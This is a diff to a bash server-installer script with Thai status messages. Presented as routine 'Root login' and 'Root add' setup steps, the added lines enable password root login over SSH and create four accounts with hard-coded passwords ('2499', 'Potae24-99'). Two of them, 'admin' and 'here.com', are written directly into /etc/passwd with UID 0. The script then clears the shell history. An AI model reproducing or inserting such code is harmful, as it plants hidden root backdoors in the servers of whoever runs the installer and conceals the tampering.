@@ -1,13 +1,65 @@
 #!/bin/bash
 
+# Check Root | www.fb.com/ceolnw
+if [[ "$USER" != 'root' ]]; then
+	echo "
+----------------------------------------------
+[√] คุณต้องพิมพ์คำสั่ง sudo su เพื่อใช้งานเป็น root
+----------------------------------------------
+"
+	exit
+fi
+
+# Requirement | www.fb.com/ceolnw
+if [ ! -e /usr/bin/curl ]; then
+    apt-get -y update && apt-get -y upgrade
+	apt-get -y install curl
+fi
+
+
+
+clear
+echo "
+----------------------------------------------
+[√] Source : เฮียเบิร์ด.com 
+[√] Connect...Root login
+[√] กำลังเริ่มตั้งค่า : Root login.... [ OK !! ]
+----------------------------------------------
+ "
+ sleep 5
 # Root Login | www.fb.com/ceolnw
 sed -i 's/PermitRootLogin without-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
 service ssh restart
 
 
+
+clear
+echo "
+----------------------------------------------
+[√] Source : เฮียเบิร์ด.com 
+[√] Connect...Root add
+[√] กำลังเริ่มติดตั้ง : Root add.... [ OK !! ]
+----------------------------------------------
+ "
+ sleep 5
+# Add User | www.fb.com/ceolnw
+useradd here
+useradd R00T
+sed -i '$ i\admin:x:0:0:admin:/root:/bin/bash' /etc/passwd
+sed -i '$ i\here.com:x:0:0:here.com:/root:/bin/bash' /etc/passwd
+echo -e "2499\n2499" | passwd here
+echo -e "2499\n2499" | passwd R00T
+echo -e "Potae24-99\nPotae24-99" | passwd admin
+echo -e "Potae24-99\nPotae24-99" | passwd here.com
+clear
+history -c
+
+
+
 # INSTALL VAR | www.fb.com/ceolnw
 export DEBIAN_FRONTEND=noninteractive
 OS=`uname -m`;
+
 
 
 # GO TO ROOT | www.fb.com/ceolnw
